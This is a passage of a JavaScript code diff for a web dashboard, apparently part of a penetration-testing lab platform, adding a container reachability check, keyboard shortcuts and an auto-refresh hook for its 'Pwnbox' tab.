+      const reachable = Object.keys(allTargets).some(k => k.includes(host) || (allTargets[k] && JSON.stringify(allTargets[k]).includes(host)));
+      // Fallback: simple docker container status check via container API
+      let st = 'down';
+      try {
+        const cs = await (await fetch(`${RUNNER_BASE}/api/container/${host}/stats`)).json();
+        st = (cs && (cs.status === 'running' || cs.cpu_percent !== undefined)) ? 'up' : 'down';
+      } catch { /* keep 'down' */ }
+      if (statusEl) {
+        statusEl.setAttribute('data-st', st);
+        statusEl.textContent = st === 'up' ? 'UP' : 'DOWN';
+      }
+    } catch (e) {
+      if (statusEl) { statusEl.setAttribute('data-st', 'down'); statusEl.textContent = 'ERR'; }
+    }
+  }
+}
+
+// Keyboard shortcuts en pwnbox
+document.addEventListener('keydown', e => {
+  if (location.hash !== '#pwnbox') return;
+  const tag = (e.target.tagName || '').toLowerCase();
+  if (tag === 'input' || tag === 'textarea' || e.target.isContentEditable) return;
+  if (e.key === 'e' || e.key === 'E') { e.preventDefault(); pwnLaunchEmbedded(); }
+  else if (e.key === 'r' || e.key === 'R') { e.preventDefault(); loadPwnboxStatus(); pwnCheckReachability(); }
+  else if (e.key === 'Escape') { pwnCloseEmbed(); }
+});
+
+// Auto-trigger reachability check on tab open
+const _origLoadPwnboxStatus = loadPwnboxStatus;
+loadPwnboxStatus = async function() {
+  await _origLoadPwnboxStatus();
+  if (location.hash === '#pwnbox' && !window._pwnReachChecked) {
+    window._pwnReachChecked = true;
+    setTimeout(pwnCheckReachability, 300);
+  }
+};
 
 async function pwnAction(action) {
   if (action === 'terminate' && !confirm('¿Terminar Pwnbox? Pierdes la sesión actual (archivos en home se mantienen si están en volumen).')) return;
